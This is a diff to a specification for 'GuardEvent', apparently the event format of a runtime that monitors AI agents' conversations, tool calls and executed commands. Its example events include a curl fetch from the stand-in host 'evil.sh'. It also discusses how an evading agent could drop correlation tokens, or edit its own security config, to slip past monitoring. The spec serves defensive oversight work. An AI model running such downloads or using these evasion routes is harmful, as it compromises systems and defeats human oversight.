@@ -3,25 +3,59 @@
 A `GuardEvent` is the unit an interception point submits to the runtime. It is
 the OGR analogue of an OpenTelemetry span. Keywords per RFC 2119.
 
+The MUST set is deliberately tiny: **`kind` + `payload`** is a complete,
+conformant event. Everything else refines attribution or correlation, and the
+runtime has a defined fallback for each absence. The minimal integration is an
+API key and two fields.
+
 ## Fields
 
 | Field | Type | Req | Description |
 |---|---|---|---|
-| `ogr_version` | string | MUST | Spec version, e.g. `"0.5"`. |
-| `event_id` | string | MUST | Unique id for this observation. |
-| `guard_id` | string | MUST | Stable across observation points for one logical action. See [guard-context](provenance-and-context.md#guard-context-propagation). |
-| `session_id` | string | SHOULD | Conversation / agent-run id. Enables stateful, multi-turn detection. |
-| `timestamp` | string | MUST | RFC 3339 / ISO 8601 UTC. |
-| `observation_point` | enum | MUST | `conversation` \| `invocation` \| `execution`. The altitude — *what* was seen. |
-| `sensor` | object | SHOULD | *Which* integration saw it, and how evadable that observer is. See [`sensor`](#sensor). |
 | `kind` | enum | MUST | See **Kinds** below. |
-| `subject` | object | SHOULD | Which agent is acting — the five-field agent identity. A key-only caller MAY omit it; the runtime derives the agent from the API key ([identity floor](#the-api-key-is-the-identity-floor)). |
 | `payload` | object | MUST | Kind-specific body. |
+| `ogr_version` | string | MAY | Spec version, e.g. `"0.6"`. Absent = the current version. |
+| `guard_id` | string | MAY | Correlation HINT: stable across observation points for one logical action, sent only by deployments that actually propagate it ([guard-context](provenance-and-context.md#guard-context-propagation)). Absent, the runtime assigns one and correlates altitudes itself ([below](#identifiers-are-born-at-the-runtime)). |
+| `session_id` | string | SHOULD | Conversation / agent-run id. Enables stateful, multi-turn detection. Absent, the runtime derives sessions itself. |
+| `timestamp` | string | SHOULD | RFC 3339 / ISO 8601 UTC — when the unit was OBSERVED. Absent = the runtime's receive time; only buffered/replayed events need it explicitly. |
+| `observation_point` | enum | SHOULD | `conversation` \| `invocation` \| `execution`. The altitude — *what* was seen. Absent, the runtime defaults it from `kind`: transcript kinds → `conversation`, `tool_call`/`tool_result`/`agent_spawn`/`config_change` → `invocation`, `exec`/`network`/`file` → `execution`. Assert it explicitly whenever the default is wrong for your vantage point (a gateway seeing `tool_call` still observes at `conversation`). |
+| `sensor` | object | SHOULD | *Which* integration saw it, and how evadable that observer is. See [`sensor`](#sensor). |
+| `subject` | object | SHOULD | Which agent is acting — the five-field agent identity. A key-only caller MAY omit it; the runtime derives the agent from the API key ([identity floor](#the-api-key-is-the-identity-floor)). |
 | `provenance` | array | SHOULD | Trust/taint of the inputs that produced this action. See [Provenance](provenance-and-context.md). |
 | `llm_protocol` | enum \| null | MAY | `openai.chat` \| `openai.responses` \| `anthropic.messages` \| `null`. Set by adapters observing at the `conversation` altitude. |
-| `context_refs` | array | MAY | `event_id`s of related prior events. |
 | `content_encoding` | enum | MAY | `raw` (default) \| `redacted` \| `hashed` \| `metadata_only` — how the payload content was transformed before emission. See [Local redaction](local-redaction.md). |
 | `redactions` | array | MAY | Spans the adapter transformed locally before emission (metadata only, never originals). MUST be populated when `content_encoding` is `redacted`. See [Local redaction](local-redaction.md). |
+
+There is **no `event_id` on the request**. Identifiers are the runtime's job:
+
+### Identifiers are born at the runtime
+
+The runtime MUST assign every accepted event a unique, time-ordered
+**`event_id`** at ingress and return it to the caller — on the
+[`Verdict`](verdict.md) for `/v1/evaluate`, in the per-element `results` row
+for `/v1/ingest` (order preserved). A client that wants to reference or query
+an event uses the returned id; it never mints one. Client-minted ids existed
+to make ingest retries deduplicable — a transport concern that does not
+belong in the data model. There is **no request deduplication**: a client
+that retries a timed-out call MAY produce a duplicate record, which
+observability data tolerates. A deployment that needs exactly-once delivery
+is the use case for a future optional idempotency HTTP header, not for an
+event field.
+
+**`guard_id`** follows the same rule with one addition: a PEP that really
+carries a guard-context across altitudes MAY send its own value, and the
+runtime MUST honor it. Absent, the runtime assigns `guard_id = event_id` and
+SHOULD correlate altitudes server-side: two events from the same agent,
+within a short window, whose payloads project to the same
+[canonical digest](enrollment-and-receipts.md#payload-canonicalization)
+(`tool_call {name, arguments}` ↔ `exec {argv, cwd}`, the same projections
+approval receipts bind) are one logical action and SHOULD share a guard
+group. Server-side correlation is the baseline precisely because the
+propagation token rides through the process OGR distrusts — an evading agent
+simply drops it, so a correlation that only works when the agent cooperates
+is not a correlation, it is a courtesy. A kernel-altitude event that matches
+NO invocation sibling under either mechanism is itself a signal: the agent
+ran something it never declared.
 
 ### `subject`
 
@@ -58,7 +92,7 @@ instructions to a high-privilege one).
 ### The API key is the identity floor
 
 The five-tuple degrades gracefully. The minimum conformant integration sends
-only the workspace API key and no `subject` at all: the runtime MUST then
+only the organization API key and no `subject` at all: the runtime MUST then
 derive `agent_id` from the key (one key, one default agent), place the agent
 in the key's workspace, and treat every session as the same single user.
 Each field a PEP can assert refines that picture; none is a precondition for
@@ -156,12 +190,21 @@ with semantics that an execution-altitude `file` write loses — configuration
 integrity is a named attack target, and editing the agent's own security
 config is a first move against the `invocation` altitude.
 
-## Example — execution-altitude `exec` of a piped installer
+## Example — minimal conformant event
+
+```json
+{ "kind": "exec", "payload": { "argv": ["curl", "-fsSL", "https://evil.sh"] } }
+```
+
+The runtime supplies everything else: `event_id` (returned on the verdict),
+`guard_id` (= `event_id`), timestamp (receive time), the agent (derived from
+the API key), the session (derived), the workspace (the key's).
+
+## Example — execution-altitude `exec` of a piped installer, fully attributed
 
 ```json
 {
-  "ogr_version": "0.5",
-  "event_id": "evt-9f2",
+  "ogr_version": "0.6",
   "guard_id": "ga-1a2b",
   "session_id": "run-55",
   "timestamp": "2026-06-27T16:40:00Z",
@@ -174,5 +217,9 @@ config is a first move against the `invocation` altitude.
   ]
 }
 ```
+
+`guard_id` here is a propagated guard-context (the agent hook that declared
+this action minted it); `provenance[].ref` points at a runtime-returned
+`event_id` the adapter captured earlier.
 
 The normative JSON Schema is [`schema/guard-event.schema.json`](../schema/guard-event.schema.json).
